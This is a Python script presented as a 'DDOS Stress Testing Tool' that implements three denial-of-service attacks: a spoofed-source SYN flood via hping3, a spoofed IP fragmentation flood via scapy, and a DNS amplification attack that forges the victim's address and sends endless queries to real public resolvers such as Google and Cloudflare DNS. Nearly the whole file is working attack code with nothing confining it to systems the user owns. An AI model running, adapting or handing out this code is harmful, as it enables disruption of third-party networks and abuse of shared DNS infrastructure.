"""
DDOS Stress Testing Tool

This tool provides multiple attack options for stress testing networks.
Developed collaboratively by the DDOS team at DeepCytes.
Contributions are welcomed and appreciated.

"""

import os , subprocess ,sys , argparse
import socket
from random import randint , choice , random
import threading
from scapy.all import IP, ICMP, send ,conf,UDP, DNS, DNSQR

conf.verb = 0

#Script for syn flood attack
def syn_flood(target_ip,port,threads):
    packet_count = 1000
    data_size = 120
    window_size = 64
    command = [
        'sudo',
        'hping3',
        '--count', str(packet_count),
        '--data', str(data_size),
        '--syn',
        '--win', str(window_size),
        '-p', str(port),
        '--flood',
        '--rand-source',
        target_ip
    ]
    try:
        subprocess.run(command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"Error {e}")

# Script for IP Fragmentation attack
def ip_frag(target_ip,threads):
    frag_size = 20
    num_fragments = 1000 
    def ip_frag_attack(frag_size, num_fragments):
        try:
            fragments = []
            payload = "X" * frag_size
            for i in range(num_fragments):
                src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                ip_packet = IP(dst=target_ip, src=src_ip)
                frag = ip_packet/ICMP()/payload
                frag.frag = i * (frag_size // 8)
                frag.flags = "MF" if i < num_fragments - 1 else 0
                fragments.append(frag)
            for frag in fragments:
                send(frag)
        except Exception as e:
            print(f"Error {e}")

    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=ip_frag_attack, args=(frag_size, num_fragments))
        threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()

#Script for DNS Amplification attack
def dns_amp(target_ip,threads):
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "208.67.222.222", 
        "208.67.220.220", "9.9.9.9", "149.112.112.112", "8.26.56.26", 
        "8.20.247.20", "199.85.126.10", "199.85.127.10", "77.88.8.8", 
        "77.88.8.88", "77.88.8.7", "64.6.64.6", "64.6.65.6"
    ]

    known_domains = [
        "openresolver.com", "testdnssec.com", "dns-oarc.net", "yahoo.com", 
        "google.com", "microsoft.com", "amazon.com", "facebook.com", 
        "twitter.com", "linkedin.com", "instagram.com", "apple.com",
        "baidu.com", "t.co", "wikipedia.org", "cnn.com", "bbc.com", 
        "example.com", "paypal.com", "ebay.com", "cloudflare.com", 
        "shopify.com", "oracle.com", "adobe.com", "github.com", 
        "netflix.com", "reddit.com", "dropbox.com", "salesforce.com", 
        "twitch.tv", "spotify.com", "tumblr.com", "stackexchange.com", 
        "zoom.us", "quora.com", "mail.ru", "yandex.ru", "vk.com", 
        "dailymotion.com", "weather.com", "hulu.com", "live.com"
    ]

    def dns_amplification():
        while True:
            dns_server = choice(dns_servers)  
            domain = choice(known_domains)   
            ip_layer = IP(src=target_ip, dst=dns_server)
            udp_layer = UDP(dport=53)
            dns_layer = DNS(rd=1, qd=DNSQR(qname=domain))
            packet = ip_layer / udp_layer / dns_layer
            send(packet, verbose=0) 

    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=dns_amplification)
        threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()

def main():
    parser = argparse.ArgumentParser(description='Attack options')
    parser.add_argument('--ip', type=str)
    parser.add_argument('--port', type=int)
    parser.add_argument('--dom' , type=str)
    parser.add_argument('--threads', type=int)
    parser.add_argument('--attack', choices=['syn','ipfrag', 'dns'], required=True)

    args = parser.parse_args()

    if args.attack == 'syn':
        syn_flood(args.ip, args.port, args.threads)
    elif args.attack == 'ipfrag':
        ip_frag(args.ip, args.threads)
    elif args.attack == 'dns':
        dns_amp(args.ip, args.threads)

if __name__ == '__main__':
    main()